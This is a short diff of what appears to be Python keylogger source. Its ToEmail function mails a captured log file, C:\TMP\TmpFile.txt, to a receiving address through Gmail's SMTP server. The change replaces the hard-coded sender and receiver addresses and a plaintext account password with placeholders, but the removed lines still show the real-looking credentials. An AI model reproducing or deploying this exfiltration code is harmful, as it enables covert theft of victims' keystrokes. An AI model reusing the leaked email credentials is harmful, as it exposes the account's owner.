@@ -34,8 +34,8 @@ def KeyLog():
                 f.write(line)
 
 def ToEmail():
-    email = 'rexr3389@gmail.com'
-    SendToEmail = 'pprayzen@gmail.com'
+    email = '*****@gmail.com' #email that is gonna send the information
+    SendToEmail = '*****@gmail.com' #email that is gonna receive the information
     UpLoadFilePath = 'C:\\TMP\\TmpFile.txt'
      
     msg = MIMEMultipart()
@@ -59,7 +59,7 @@ def ToEmail():
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.ehlo()
     server.starttls()
-    server.login(email, 'ilpkibficlmmreut')
+    server.login(email, Put_Mail_Password_Here)
     text = msg.as_string()
     server.sendmail(email, SendToEmail, text)
     server.quit()
